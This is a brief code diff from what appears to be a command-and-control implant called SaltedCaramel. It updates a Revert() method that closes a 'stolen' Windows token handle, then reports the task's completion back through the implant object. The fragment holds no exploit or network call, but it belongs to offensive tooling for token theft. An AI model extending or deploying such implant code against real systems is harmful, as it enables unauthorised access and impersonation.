@@ -81,10 +81,11 @@ namespace SaltedCaramel
 
         }
 
-        internal static void Revert()
+        internal static void Revert(SCTask task, SCImplant implant)
         {
             Win32.CloseHandle(stolenHandle);
             stolenHandle = IntPtr.Zero;
+            implant.SendComplete(task.id);
         }
     }
 }
